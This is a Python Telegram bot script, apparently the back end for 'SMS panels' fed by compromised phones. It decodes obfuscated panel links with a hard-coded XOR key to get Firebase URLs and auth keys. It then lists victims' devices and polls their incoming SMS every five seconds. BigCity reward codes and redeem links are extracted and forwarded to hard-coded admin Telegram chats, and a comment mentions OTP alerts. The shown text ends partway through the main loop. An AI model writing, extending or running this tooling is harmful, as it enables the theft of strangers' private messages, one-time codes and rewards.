#!/usr/bin/env python3
"""
==============================================================
  Universal SMS Panel Monitor — Telegram Bot
  (SIRF requests library — koi aur install nahi chahiye)
==============================================================
  Features (screenshot jaisa):
  - /start  -> Welcome + Chat ID + inline keyboard buttons
  - ➕ Add Panel -> link bhejo -> "N Panels add ho gaye!"
                     + us panel ka Online/Offline/Total turant
  - 📊 Status   -> Monitor Status (per-panel devices, Total, Active Users)
                     + har panel pe tap -> detail page
  - 📋 My Panels -> panel list
  - ❌ Remove Panel -> delete
  - 📨 Naya SMS aate hi turant Telegram pe forward (5 sec check)

  SETUP (AXXU hosting ke liye):
    - sirf ye file upload karo (main.py naam se rename kar sakte ho)
    - koi library install nahi karni — python me requests pre-installed hai
    - Run / Start kar do
==============================================================
"""
import json
import re
import base64
import time
import html
import threading
from datetime import datetime, timezone
from urllib.parse import quote

import requests
import os

# =====================================================================
#  TOKEN (BotFather se mila) — already daal diya hai
# =====================================================================
# Set BOT_TOKEN in the hosting environment; do not commit or paste the token in source.
BOT_TOKEN = os.environ.get("BOT_TOKEN", "").strip()

#  ZXKAI panel link decode key
KEY = "ZXKAIv1_Xk9mP2wN7qL4vR6jH3cF8yT1ZbE5sA09"

#  har 5 second me panels ke naye SMS check karega
POLL_SECONDS = 5

API = f"https://api.telegram.org/bot{BOT_TOKEN}"
PANELS_FILE = "panels.json"
CHAT_FILE = "known_chats.json"
ACCESS_FILE = "access.json"
SEEN_FILE = "seen_messages.json"
file_lock = threading.RLock()

# OTP/promo alerts sirf in admin chat IDs ko bheje jayenge.
ADMIN_CHAT_IDS = {8739344756, 5709742457}

# =====================================================================
#  Telegram helper functions (raw API, sirf requests)
# =====================================================================

def tg(method, **params):
    """Telegram API call — returns result dict or None."""
    try:
        r = requests.post(f"{API}/{method}", json=params, timeout=30)
        j = r.json()
        if j.get("ok"):
            return j.get("result")
        print("TG ERROR", method, j)
        return None
    except Exception as e:
        print("TG FAIL", method, e)
        return None


def send(chat_id, text, keyboard=None, reply_to=None):
    """Text bhejo, optional inline keyboard ke saath. HTML parse_mode."""
    params = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    if reply_to:
        params["reply_to_message_id"] = reply_to
    if keyboard:
        params["reply_markup"] = {"inline_keyboard": keyboard}
    return tg("sendMessage", **params)


def answer_callback(query_id, text=None):
    tg("answerCallbackQuery", callback_query_id=query_id, text=text or "")


def edit(chat_id, message_id, text, keyboard=None):
    params = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": "HTML",
    }
    if keyboard:
        params["reply_markup"] = {"inline_keyboard": keyboard}
    return tg("editMessageText", **params)


def get_updates(offset):
    r = tg("getUpdates", offset=offset, timeout=25)
    return r or []


def delete_message(chat_id, message_id):
    tg("deleteMessage", chat_id=chat_id, message_id=message_id)


# =====================================================================
#  Panel link parsing
# =====================================================================

def decode_zxkai_link(link):
    """s= parameter decode -> (firebase_url, api_key)."""
    m = re.search(r"s=([^&]+)", link)
    if not m:
        return None
    s = m.group(1)
    b64 = s.replace("-", "+").replace("_", "/")
    b64 += "=" * (-len(b64) % 4)
    try:
        raw = base64.b64decode(b64)
        dec = bytes(b ^ KEY[i % len(KEY)].encode()[0] for i, b in enumerate(raw))
        obj = json.loads(dec)
    except Exception:
        return None
    return obj.get("u", ""), obj.get("k", "")


def decode_base64_panel_link(link):
    """Decode ProfexHub/FireXPanel s= payloads of ``firebase_url|||api_key``."""
    m = re.search(r"[?&]s=([^&\s]+)", link)
    if not m:
        return None
    value = m.group(1).replace("-", "+").replace("_", "/")
    value += "=" * (-len(value) % 4)
    try:
        decoded = base64.b64decode(value, validate=False).decode("utf-8", errors="strict")
    except Exception:
        return None
    parts = [part.strip() for part in decoded.split("|||", 1)]
    if not parts or not parts[0].startswith(("http://", "https://")):
        return None
    return parts[0], parts[1] if len(parts) > 1 else ""


def decode_profex_link(link):
    """Backward-compatible alias for the generic Base64 wrapper decoder."""
    return decode_base64_panel_link(link)


def normalize_firebase(url, key=""):
    """Return a safe canonical Firebase URL and its authentication key."""
    url = str(url or "").strip().strip("<>")
    url = re.sub(r"/+$", "", url)
    parsed = re.match(r"^(https?://[^/?#]+)(?:/[^?#]*)?(?:\?([^#]*))?(?:#.*)?$", url, re.I)
    if not parsed or not re.search(r"(?:firebaseio\.com|firebasedatabase\.app)$", parsed.group(1), re.I):
        return None
    base = parsed.group(1).rstrip("/")
    query = parsed.group(2) or ""
    auth_match = re.search(r"(?:^|&)auth=([^&]+)", query)
    normalized_key = str(key or auth_match.group(1) if auth_match else key or "").strip()
    return base, normalized_key


def parse_panel_link(link):
    """Unified parser for ProfexHub, FireXPanel, ZXKAI, and direct Firebase links."""
    link = str(link or "").strip().strip("<>")
    decoded = decode_zxkai_link(link)
    if not decoded or not decoded[0]:
        decoded = decode_base64_panel_link(link)
    if decoded and decoded[0]:
        return normalize_firebase(decoded[0], decoded[1])
    direct = normalize_firebase(link)
    return direct


def label_from_url(url):
    m = re.search(r"https?://([a-z0-9\-]+)\.(?:firebaseio\.com|firebasedatabase\.app)", url, re.I)
    return m.group(1) if m else "Firebase Panel"


# =====================================================================
#  Storage
# =====================================================================

def load_json(path, default):
    try:
        with open(path, "r") as f:
            return json.load(f)
    except Exception:
        return default


def save_json(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=2)


def load_panels():
    return load_json(PANELS_FILE, {})


def save_panels(p):
    save_json(PANELS_FILE, p)


def load_known_chats():
    return set(load_json(CHAT_FILE, []))


def save_known_chats(chats):
    save_json(CHAT_FILE, list(chats))


def now_text():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def load_access():
    return load_json(ACCESS_FILE, {})


def save_access(data):
    with file_lock:
        save_json(ACCESS_FILE, data)


def is_admin(user_id):
    return int(user_id) in ADMIN_CHAT_IDS


def access_record(user_id, user=None, message_text=""):
    uid = str(user_id)
    data = load_access()
    rec = data.get(uid)
    if rec is None:
        user = user or {}
        rec = {
            "user_id": user_id,
            "name": user.get("name", "Unknown"),
            "username": user.get("username", ""),
            "message": message_text or "No message",
            "status": "pending",
            "requested_at": now_text(),
            "approved_at": "",
            "approved_by": "",
            "request_message_ids": {},
        }
        data[uid] = rec
        save_access(data)
    else:
        changed = False
        if user:
            full_name = user.get("name") or rec.get("name") or "Unknown"
            username = user.get("username") or rec.get("username") or ""
            if rec.get("name") != full_name:
                rec["name"] = full_name; changed = True
            if rec.get("username") != username:
                rec["username"] = username; changed = True
        if message_text and message_text != rec.get("message"):
            rec["message"] = message_text; changed = True
        if changed:
            data[uid] = rec; save_access(data)
    return rec


def access_status(user_id):
    if is_admin(user_id):
        return "approved"
    return load_access().get(str(user_id), {}).get("status")


def access_message(status):
    return {
        "pending": "⏳ <b>ACCESS PENDING</b>\n\nAdmin approval ka wait karo.",
        "rejected": "❌ <b>ACCESS DENIED</b>\n\nYour access request was rejected by admin.",
        "revoked": "🚫 <b>ACCESS REVOKED</b>\n\nYour bot access has been revoked by admin.",
    }.get(status, "⏳ <b>ACCESS PENDING</b>\n\nAdmin approval ka wait karo.")


def allowed_or_notify(chat_id, message_id=None):
    if is_admin(chat_id):
        return True
    status = access_status(chat_id)
    if status == "approved":
        return True
    send(chat_id, access_message(status or "pending"), reply_to=message_id)
    return False


def user_label(rec):
    username = rec.get("username") or "No username"
    return f"@{html.escape(username)}" if username != "No username" else html.escape(username)


def notify_access_request(rec):
    msg = html.escape(str(rec.get("message") or "No message")[:500])
    text = (
        "👤 <b>NEW ACCESS REQUEST</b>\n━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 User ID: <code>{rec['user_id']}</code>\n"
        f"👤 Name: <b>{html.escape(str(rec.get('name', 'Unknown'))[:120])}</b>\n"
        f"🔗 Username: {user_label(rec)}\n💬 Message: <code>{msg}</code>\n"
        f"🕒 Requested: {html.escape(rec.get('requested_at', ''))}\n"
        "━━━━━━━━━━━━━━━━━━━\n⏳ Status: <b>PENDING</b>"
    )
    kb = [[
        {"text": "✅ Approve", "callback_data": f"approve:{rec['user_id']}"},
        {"text": "❌ Reject", "callback_data": f"reject:{rec['user_id']}"},
    ]]
    ids = rec.setdefault("request_message_ids", {})
    for admin_id in ADMIN_CHAT_IDS:
        if str(admin_id) in ids:
            continue
        result = send(admin_id, text, keyboard=kb)
        if result and result.get("message_id"):
            ids[str(admin_id)] = result["message_id"]
    data = load_access(); data[str(rec["user_id"])] = rec; save_access(data)


def request_access(chat_id, user, message_text, reply_to=None):
    rec = access_record(chat_id, user, message_text)
    if rec.get("status") == "pending" and not rec.get("request_message_ids"):
        notify_access_request(rec)
    send(chat_id, access_message(rec.get("status")), reply_to=reply_to)


# =====================================================================
#  Panel data fetch
# =====================================================================

def fetch_panel_data(url, key):
    r = requests.get(f"{url}/clients.json?auth={key}", timeout=30)
    r.raise_for_status()
    data = r.json() or {}
    total = len(data)
    online = {k: v for k, v in data.items() if isinstance(v, dict) and v.get("status")}
    return {
        "total": total,
        "online": len(online),
        "offline": total - len(online),
        "online_devices": online,
    }


# =====================================================================
#  Keyboards
# =====================================================================

def main_keyboard(chat_id=None):
    kb = [
        [
            {"text": "📊 Status", "callback_data": "status"},
            {"text": "📋 My Panels", "callback_data": "mypanels"},
        ],
        [
            {"text": "➕ Add Panel", "callback_data": "add"},
            {"text": "❌ Remove Panel", "callback_data": "remove"},
        ],
    ]
    if chat_id is not None and is_admin(chat_id):
        kb.append([{ "text": "👥 Access Users", "callback_data": "access_users" }])
    return kb


# =====================================================================
#  User states
# =====================================================================
chat_state = {}          # chat_id -> state  ("add", None)
KNOWN_CHATS = load_known_chats()
state_lock = threading.Lock()


# =====================================================================
#  Command / button handlers
# =====================================================================

def cmd_start(chat_id, message_id, user=None, message_text=""):
    user = user or {}
    with state_lock:
        chat_state.pop(chat_id, None)
        KNOWN_CHATS.add(chat_id)
        save_known_chats(KNOWN_CHATS)
    if not is_admin(chat_id):
        rec = access_record(chat_id, user, message_text)
        if rec.get("status") != "approved":
            if rec.get("status") == "pending" and not rec.get("request_message_ids"):
                notify_access_request(rec)
            send(chat_id, access_message(rec.get("status")), reply_to=message_id)
            return
    txt = (
        "🤖 <b>Universal SMS Panel Monitor</b>\n\n"
        "✅ Sabhi panels (ZXKAI, Profex, Firebase) supported hain.\n\n"
        "• 📊 Status — Panel check\n"
        "• 📋 My Panels — Panel list\n"
        "• ➕ Add Panel — Add multiple links\n"
        "• ❌ Remove Panel — Delete panel\n\n"
        f"👤 Your Chat ID: <code>{chat_id}</code>"
    )
    result = send(chat_id, txt, keyboard=main_keyboard(chat_id), reply_to=message_id)
    if result and result.get("message_id"):
        with dashboard_lock:
            dashboard_state[chat_id] = {"message_id": result["message_id"], "page": 1, "rendered": "", "last_update": 0.0}
        _render_dashboard(chat_id, page=1, force=True)


def panel_name_from_index(panels, index_text):
    """Short callback index se actual panel name resolve karta hai."""
    try:
        index = int(index_text)
        names = list(panels.keys())
        return names[index - 1] if 1 <= index <= len(names) else None
    except (TypeError, ValueError):
        return None


DASHBOARD_PAGE_SIZE = 8
dashboard_lock = threading.RLock()
dashboard_state = {}  # chat_id -> message_id, page, rendered, last_update
panel_status_cache = {}


def _panel_entries():
    return list(load_panels().items())


def _dashboard_pages_count(total):
    return max(1, (total + DASHBOARD_PAGE_SIZE - 1) // DASHBOARD_PAGE_SIZE)


def _panel_snapshot(name, panel):
    try:
        data = fetch_panel_data(panel.get("url", ""), panel.get("key", ""))
        snap = {"ok": True, **data}
    except Exception:
        snap = {"ok": False, "total": 0, "online": 0, "offline": 0, "online_devices": {}}
    panel_status_cache[name] = snap
    return snap


def _render_dashboard(chat_id, message_id=None, page=None, force=False):
    if not allowed_or_notify(chat_id, message_id):
        return
    with dashboard_lock:
        entries = _panel_entries()
        total_pages = _dashboard_pages_count(len(entries))
        state = dashboard_state.setdefault(chat_id, {"message_id": message_id, "page": 1, "rendered": "", "last_update": 0.0})
        if message_id:
            state["message_id"] = message_id
        current_page = int(page or state.get("page", 1) or 1)
        current_page = max(1, min(current_page, total_pages))
        state["page"] = current_page
        for name, panel in entries:
            if name not in panel_status_cache:
                _panel_snapshot(name, panel)
        active = offline = total_devices = online_devices = 0
        for name, panel in entries:
            snap = panel_status_cache.get(name) or _panel_snapshot(name, panel)
            if snap.get("ok"):
                active += 1
                total_devices += snap.get("total", 0)
                online_devices += snap.get("online", 0)
            else:
                offline += 1
        page_items = entries[(current_page - 1) * DASHBOARD_PAGE_SIZE: current_page * DASHBOARD_PAGE_SIZE]
        lines = [
            "⚡ <b>PANEL CONTROL CENTER</b>",
            "━━━━━━━━━━━━━━━━━━━━━━",
            f"📡 Panels\n🟢 Active: {active}\n🔴 Offline: {offline}\n📊 Total: {len(entries)}",
            f"\n📱 Devices\n🟢 Online: {online_devices}\n🔴 Offline: {max(0, total_devices - online_devices)}\n📱 Total: {total_devices}",
            f"\n📨 SMS Monitor\n⚡ New: {sms_stats['new']}\n📤 Forwarded: {sms_stats['forwarded']}",
            "━━━━━━━━━━━━━━━━━━━━━━",
            f"📄 Panel Page: {current_page} / {total_pages}",
            "━━━━━━━━━━━━━━━━━━━━━━",
        ]
        kb = []
        for index, (name, panel) in enumerate(page_items, (current_page - 1) * DASHBOARD_PAGE_SIZE + 1):
            snap = panel_status_cache.get(name) or {}
            if snap.get("ok"):
                lines.append(f"\n🟢 <b>Panel {index}</b>\n📱 Total: {snap.get('total', 0)}\n🟢 Online: {snap.get('online', 0)}\n🔴 Offline: {snap.get('offline', 0)}")
            else:
                lines.append(f"\n🔴 <b>Panel {index}</b>\n⚠️ Unable to Fetch Panel")
            kb.append([{"text": f"👁 Panel {index}", "callback_data": f"det:{index}:{current_page}"}])
        nav = []
        if current_page > 1:
            nav.append({"text": "◀️ Previous", "callback_data": f"page:{current_page - 1}"})
        nav.append({"text": f"{current_page}/{total_pages}", "callback_data": f"page:{current_page}"})
        if current_page < total_pages:
            nav.append({"text": "Next ▶️", "callback_data": f"page:{current_page + 1}"})
        kb.append(nav)
        kb.append([{"text": "➕ Add Panel", "callback_data": "add"}, {"text": "❌ Remove Panel", "callback_data": "remove"}])
        kb.append([{"text": "📋 My Panels", "callback_data": "mypanels"}])
        if is_admin(chat_id):
            kb.append([{"text": "👥 Access Users", "callback_data": "access_users"}])
        text = "\n".join(lines)
        target_id = state.get("message_id")
        if target_id and not force and state.get("rendered") == text:
            return
        if target_id:
            result = edit(chat_id, target_id, text, kb)
            if result is None:
                result = send(chat_id, text, keyboard=kb)
                if result:
                    state["message_id"] = result.get("message_id")
        else:
            result = send(chat_id, text, keyboard=kb)
            if result:
                state["message_id"] = result.get("message_id")
        state["rendered"] = text
        state["last_update"] = time.time()


def update_all_dashboards(force=False):
    for chat_id in list(dashboard_state):
        try:
            _render_dashboard(chat_id, page=dashboard_state[chat_id].get("page", 1), force=force)
        except Exception as exc:
            print("[DASHBOARD] update failed:", type(exc).__name__)


def handle_status(chat_id, message_id, page=1):
    _render_dashboard(chat_id, message_id=message_id, page=page, force=True)


def handle_detail(chat_id, message_id, name, page=1):
    if not allowed_or_notify(chat_id, message_id):
        return
    panels = load_panels()
    p = panels.get(name)
    if not p:
        edit(chat_id, message_id, "⚠️ Panel nahi mila.", main_keyboard(chat_id))
        return
    display_name = f"Panel {list(panels).index(name) + 1}"
    try:
        d = fetch_panel_data(p["url"], p.get("key", ""))
        devs = list(d["online_devices"].items())[:8]
        txt = (f"📡 <b>{display_name}</b>\n━━━━━━━━━━━━━━━━━━━\n"
               f"🟢 Status: Active\n📱 Total: <b>{d['total']}</b>\n"
               f"🟢 Online: <b>{d['online']}</b>\n🔴 Offline: <b>{d['offline']}</b>")
        if devs:
            txt += "\n\n<b>Online Devices</b>\n"
            for dev, info in devs:
                txt += f"• <code>{html.escape(str(dev)[:16])}</code> | Battery: {html.escape(str(info.get('battery', '?')))}\n"
    except Exception:
        txt = f"🔴 <b>{display_name}</b>\n⚠️ Unable to Fetch Panel"
    edit(chat_id, message_id, txt, [[{"text": "🔙 Back to Panels", "callback_data": f"page:{page}"}]])


def handle_mypanels(chat_id, message_id):
    if not allowed_or_notify(chat_id, message_id):
        return
    panels = load_panels()
    if not panels:
        edit(chat_id, message_id, "📭 Koi panel add nahi hai.", main_keyboard())
        return
    lines = [f"{i}. <b>Panel {i}</b>" for i, _ in enumerate(panels, 1)]
    txt = "📋 <b>My Panels</b>\n━━━━━━━━━━━━━━━━━━━\n" + "\n".join(lines)
    edit(chat_id, message_id, txt, main_keyboard())


def handle_add(chat_id, message_id):
    if not allowed_or_notify(chat_id, message_id):
        return
    with state_lock:
        chat_state[chat_id] = "add"
    edit(
        chat_id, message_id,
        "➕ <b>Add New Panels</b>\n\n"
        "Links bhejein (har link nayi line par).\n"
        "ZXKAI (?s=...) ya Firebase link chalega.",
        [[{"text": "🔙 Back", "callback_data": "back"}]],
    )


def handle_remove(chat_id, message_id):
    if not allowed_or_notify(chat_id, message_id):
        return
    panels = load_panels()
    if not panels:
        edit(chat_id, message_id, "📭 Koi panel add nahi hai.", main_keyboard())
        return
    kb = [
        [{"text": f"❌ {i}. {name[:28]}", "callback_data": f"rm:{i}"}]
        for i, name in enumerate(panels, 1)
    ]
    kb.append([{"text": "🔙 Back", "callback_data": "back"}])
    edit(chat_id, message_id, "❌ <b>Remove Panel</b>\n\nKon sa panel delete karna hai?", kb)


def handle_remove_confirm(chat_id, message_id, name):
    panels = load_panels()
    panels.pop(name, None)
    save_panels(panels)
    update_all_dashboards(force=True)
    edit(
        chat_id, message_id,
        f"❌ <b>{html.escape(name)}</b> delete ho gaya!\n\n📋 Remaining panels: {len(panels)}",
        main_keyboard(),
    )


def handle_text_message(chat_id, text, message_id):
    """Normal text messages handle karta hai (link adding, unknown commands)."""
    if not allowed_or_notify(chat_id, message_id):
        if text and not text.startswith("/"):
            rec = access_record(chat_id, {"name": "", "username": ""}, text)
            if rec.get("status") == "pending" and not rec.get("request_message_ids"):
                notify_access_request(rec)
        return
    with state_lock:
        state = chat_state.get(chat_id)
    if state == "add":
        links = [l for l in re.split(r"[\s,;]+", text) if l.strip()]
        panels = load_panels()
        added, invalid, duplicates = [], 0, 0
        for link in links:
            res = parse_panel_link(link)
            if not res or not res[0]:
                invalid += 1
                continue
            url, key = res
            if any(normalize_firebase(p.get("url", ""), p.get("key", ""))[0] == url for p in panels.values() if normalize_firebase(p.get("url", ""), p.get("key", ""))):
                duplicates += 1
                continue
            name = f"panel_{len(panels) + 1}"
            while name in panels:
                name = f"panel_{len(panels) + 1}"
            panels[name] = {"url": url, "key": key, "added": time.strftime("%Y-%m-%d %H:%M")}
            added.append(name)
        save_panels(panels)
        with state_lock:
            chat_state.pop(chat_id, None)

        kb = [[{"text": "📊 Status", "callback_data": "status"}]]
        if added:
            lines = []
            for index, name in enumerate(added, 1):
                p = panels[name]
                try:
                    d = fetch_panel_data(p["url"], p.get("key", ""))
                    lines.append(
                        f"✅ <b>Panel {list(panels).index(name) + 1} Added</b>\n"
                        f"🟢 Online: {d['online']}\n🔴 Offline: {d['offline']}\n📱 Total: {d['total']}"
                    )
                except Exception:
                    lines.append(f"✅ <b>Panel {list(panels).index(name) + 1} Added</b>\n⚠️ Unable to Fetch Panel")
            txt = "\n\n".join(lines)
        else:
            txt = "❌ Invalid Panel Link"
        if duplicates:
            txt += f"\n\n⚠️ Panel Already Added: {duplicates}"
        if invalid:
            txt += f"\n\n❌ Invalid Panel Link: {invalid}"
        send(chat_id, txt, keyboard=kb, reply_to=message_id)
        update_all_dashboards(force=True)
        return

    # unknown command / text -> help
    if text.startswith("/"):
        send(
            chat_id,
            "🤖 /start — Welcome menu dikhao\n\n"
            "Buttons use karo: Status, My Panels, Add Panel, Remove Panel\n"
            "➕ Add Panel dabao, phir panel link bhejo.",
            keyboard=main_keyboard(),
            reply_to=message_id,
        )


def handle_access_users(chat_id, message_id):
    if not is_admin(chat_id):
        edit(chat_id, message_id, "⛔ Unauthorized.", main_keyboard(chat_id))
        return
    data = load_access()
    counts = {s: 0 for s in ("approved", "pending", "rejected", "revoked")}
    kb = []
    for uid, rec in data.items():
        status = rec.get("status", "pending")
        counts[status] = counts.get(status, 0) + 1
        name = html.escape(str(rec.get("name", uid))[:24])
        kb.append([{ "text": f"{status}: {name}", "callback_data": f"user:{uid}" }])
    kb.append([{ "text": "🔙 Back", "callback_data": "back" }])
    text = ("👥 <b>Access Users</b>\n\n"
            f"🟢 Approved: {counts['approved']}\n🟡 Pending: {counts['pending']}\n"
            f"🔴 Rejected: {counts['rejected']}\n🚫 Revoked: {counts['revoked']}")
    edit(chat_id, message_id, text, kb)


def handle_access_decision(admin_id, message_id, action, target_id):
    if not is_admin(admin_id):
        edit(admin_id, message_id, "⛔ Unauthorized.")
        return
    data = load_access(); rec = data.get(str(target_id))
    if not rec:
        edit(admin_id, message_id, "⚠️ User nahi mila.", main_keyboard(admin_id)); return
    if action == "approve":
        rec["status"] = "approved"; rec["approved_at"] = now_text(); rec["approved_by"] = str(admin_id)
        title = "🟢 <b>ACCESS GRANTED</b>"
        user_text = "✅ <b>ACCESS GRANTED</b>\n━━━━━━━━━━━━━━━━━━━\nYour access has been approved.\nYou can now use the bot.\n━━━━━━━━━━━━━━━━━━━"
    elif action == "reject":
        rec["status"] = "rejected"; title = "🔴 <b>ACCESS DENIED</b>"; user_text = "❌ <b>ACCESS DENIED</b>\n━━━━━━━━━━━━━━━━━━━\nYour access request was rejected by admin.\n━━━━━━━━━━━━━━━━━━━"
    else:
        rec["status"] = "revoked"; title = "🚫 <b>ACCESS REVOKED</b>"; user_text = "🚫 <b>ACCESS REVOKED</b>\n━━━━━━━━━━━━━━━━━━━\nYour access has been revoked by admin.\n━━━━━━━━━━━━━━━━━━━"
    data[str(target_id)] = rec; save_access(data)
    send(int(target_id), user_text)
    edit(admin_id, message_id, f"{title}\n━━━━━━━━━━━━━━━━━━━\n👤 User: {html.escape(str(rec.get('name', 'Unknown')))}\n🆔 ID: <code>{target_id}</code>\n💬 Message: <code>{html.escape(str(rec.get('message', 'No message'))[:500])}</code>\n━━━━━━━━━━━━━━━━━━━\n✅ Updated by Admin", main_keyboard(admin_id))


def handle_callback(chat_id, message_id, query_id, data):
    """Inline button press handle karta hai."""
    answer_callback(query_id)
    if data.startswith("approve:") or data.startswith("reject:") or data.startswith("revoke:"):
        action, target = data.split(":", 1)
        try: handle_access_decision(chat_id, message_id, action, int(target))
        except ValueError: edit(chat_id, message_id, "⚠️ Invalid user ID.", main_keyboard(chat_id))
        return
    if data == "access_users":
        handle_access_users(chat_id, message_id); return
    if data.startswith("user:"):
        if not is_admin(chat_id): edit(chat_id, message_id, "⛔ Unauthorized."); return
        rec = load_access().get(data[5:])
        if not rec: edit(chat_id, message_id, "⚠️ User nahi mila.", main_keyboard(chat_id)); return
        uid = data[5:]; status = rec.get("status", "pending")
        kb = [[{"text": "✅ Approve", "callback_data": f"approve:{uid}"}, {"text": "❌ Reject", "callback_data": f"reject:{uid}"}], [{"text": "🚫 Revoke", "callback_data": f"revoke:{uid}"}, {"text": "🔙 Back", "callback_data": "access_users"}]]
        edit(chat_id, message_id, f"👤 <b>{html.escape(str(rec.get('name', 'Unknown')))}</b>\n🆔 <code>{uid}</code>\n🔗 {user_label(rec)}\n📌 Status: <b>{status.upper()}</b>", kb); return
    if not allowed_or_notify(chat_id, message_id):
        return
    if data == "status":
        handle_status(chat_id, message_id, 1)
    elif data.startswith("page:"):
        try:
            handle_status(chat_id, message_id, int(data.split(":", 1)[1]))
        except ValueError:
            edit(chat_id, message_id, "⚠️ Invalid page.", main_keyboard(chat_id))
    elif data.startswith("det:"):
        parts = data.split(":")
        try:
            name = panel_name_from_index(load_panels(), parts[1])
            page = int(parts[2]) if len(parts) > 2 else 1
        except (ValueError, IndexError):
            name, page = None, 1
        if name:
            handle_detail(chat_id, message_id, name, page)
        else:
            edit(chat_id, message_id, "⚠️ Panel nahi mila.", main_keyboard(chat_id))
    elif data == "mypanels":
        handle_mypanels(chat_id, message_id)
    elif data == "add":
        handle_add(chat_id, message_id)
    elif data == "remove":
        handle_remove(chat_id, message_id)
    elif data == "back":
        with state_lock:
            chat_state.pop(chat_id, None)
        handle_status(chat_id, message_id, dashboard_state.get(chat_id, {}).get("page", 1))
    elif data.startswith("rm:"):
        name = panel_name_from_index(load_panels(), data[3:])
        if name:
            handle_remove_confirm(chat_id, message_id, name)
        else:
            edit(chat_id, message_id, "⚠️ Panel nahi mila.", main_keyboard())
    else:
        answer_callback(query_id, text="❓")


# =====================================================================
#  SMS classification + Telegram formatting
# =====================================================================

sms_stats = {"new": 0, "forwarded": 0}


def format_sms_for_telegram(panel_name, dev, raw_sender, raw_message, raw_datetime=""):
    """Forward only BigCity Reward Code messages matching the requested format."""
    original = str(raw_message or "").strip()
    sender_raw = str(raw_sender or "?")
    combined = f"{sender_raw} {original}"
    if "BIGCITY" not in combined.upper():
        return None
    code_match = re.search(
        r"\breward\s+code\b.*?\bis\s+([A-Z0-9]{6,24})\b",
        original,
        re.IGNORECASE | re.DOTALL,
    )
    redeem_match = re.search(r"https?://[^\s]+", original, re.IGNORECASE)
    if not code_match or not redeem_match or not re.search(r"\bto\s+redeem\b", original, re.IGNORECASE):
        return None
    sender = html.escape(sender_raw)
    message = html.escape(original.replace("\n", " | ")[:1000])
    panel = html.escape(str(panel_name))
    device = html.escape(str(dev)[:16])
    when = html.escape(str(raw_datetime or ""))
    code = html.escape(code_match.group(1).upper())
    redeem_url = html.escape(redeem_match.group(0).rstrip(".,)"))
    campaign_match = re.search(r"reward\s+code\s+for\s+(.+?)\s+is\s+" + re.escape(code_match.group(1)), original, re.IGNORECASE | re.DOTALL)
    campaign = html.escape(campaign_match.group(1).strip(" .:-")) if campaign_match else ""
    return (
        "🎁 <b>REWARD CODE RECEIVED</b>\n━━━━━━━━━━━━━━━━━━━\n"
        + (f"🏷️ Campaign: <b>{campaign}</b>\n" if campaign else "")
        + f"🎟️ Code: <code>{code}</code>\n"
        + f"🔗 Redeem: {redeem_url}\n"
        + f"👤 Sender: <code>{sender}</code>\n"
        + f"🔗 Panel: <b>{panel}</b> | 📱 <code>{device}</code>\n"
        + (f"🕒 {when}\n" if when else "")
        + f"\n📝 <b>Message:</b>\n<code>{message}</code>"
    )


# =====================================================================
#  Live SMS forwarder (background thread)
# =====================================================================

def message_key(url, dev, mid):
    return f"{url}|{dev}|{mid}"


def forward_sms(name, url, dev, mid, msg, seen, seen_lock):
    if not isinstance(msg, dict) or msg.get("type") != "incoming":
        return
    identity = message_key(url, dev, mid)
    with seen_lock:
        if identity in seen:
            return
        # Mark before sending so two workers cannot forward the same message.
        seen.add(identity)
        save_json(SEEN_FILE, sorted(seen)[-10000:])
    sms_stats["new"] += 1
    txt = format_sms_for_telegram(name, dev, msg.get("sender", "?"), msg.get("message", ""), msg.get("dateTime", ""))
    if not txt:
        return
    for cid in ADMIN_CHAT_IDS:
        try:
            send(cid, txt)
            sms_stats["forwarded"] += 1
        except Exception as exc:
            print("[SMS] send failed:", type(exc).__name__)


def panel_worker(name, panel, devices, worker_no, seen, seen_lock):
    url, key = panel.get("url", ""), panel.get("key", "")
    auth_q = f"auth={quote(key)}" if key else "shallow=true"
    for dev in devices:
        try:
            r = requests.get(f"{url}/messages/{quote(str(dev), safe='')}.json?{auth_q}", timeout=30)
            r.raise_for_status()
            msgs = r.json() or {}
            for mid, msg in msgs.items():
                forward_sms(name, url, dev, str(mid), msg, seen, seen_lock)
        except Exception as exc:
            print(f"[PANEL] {name} [WORKER-{worker_no}] failed: {type(exc).__name__}")


def sms_poller():
    """Poll every panel with exactly two independent worker tasks."""
    seen_lock = threading.RLock()
    seen = set(load_json(SEEN_FILE, []))
    initialized = set()
    while True:
        try:
            panels = load_panels()
            for name, panel in panels.items():
                url, key = panel.get("url", ""), panel.get("key", "")
                auth_q = f"auth={quote(key)}" if key else "shallow=true"
                try:
                    r = requests.get(f"{url}/clients.json?{auth_q}", timeout=30)
                    r.raise_for_status()
                    clients = r.json() or {}
                    devs = [str(d) for d in clients if len(str(d)) == 16]
                except Exception as exc:
                    print(f"[PANEL] {name} discovery failed: {type(exc).__name__}")
                    continue
                # On first observation, baseline existing messages to avoid startup replay.
                if url not in initialized:
                    for dev in devs:
                        try:
                            r = requests.get(f"{url}/messages/{quote(dev, safe='')}.json?{auth_q}", timeout=30)
                            current = r.json() or {}
                            seen.update(message_key(url, dev, mid) for mid in current)
                        except Exception:
                            pass
                    initialized.add(url)
                    save_json(SEEN_FILE, sorted(seen)[-10000:])
                    continue
                groups = [devs[0::2], devs[1::2]]
                workers = [threading.Thread(target=panel_worker, args=(name, panel, groups[i], i + 1, seen, seen_lock), daemon=True) for i in range(2)]
                for worker in workers:
                    worker.start()
                for worker in workers:
                    worker.join()
            update_all_dashboards(force=False)
            time.sleep(POLL_SECONDS)
        except Exception as exc:
            print("[SMS] poller error:", type(exc).__name__)
            time.sleep(POLL_SECONDS)


# =====================================================================
#  Main loop (long polling)
# =====================================================================

def main():
    if not BOT_TOKEN:
        print("ERROR: BOT_TOKEN khali hai!")
        return

    print("Bot starting... getMe:", json.dumps(tg("getMe"), ensure_ascii=False))

    # background SMS poller
    threading.Thread(target=sms_poller, daemon=True).start()

    offset = None
    print("Long polling loop started. Waiting for /start from Telegram...")
    while True:
        try:
            updates = get_updates(offset)
            for u in updates:
                offset = u["update_id"] + 1
                # inline button press
                if "callback_query" in u:
                    cb = u["callback_query"]
                    msg = cb.get("message")
                    if msg and "chat" in msg:
                        handle_callback(
                            msg["chat"]["id"],
                            msg["message_id"],
                            cb["id"],
                            cb.get("data", ""),
                        )
                    continue
                # message
                if "message" in u:
                    m = u["message"]
                    chat_id = m["chat"]["id"]
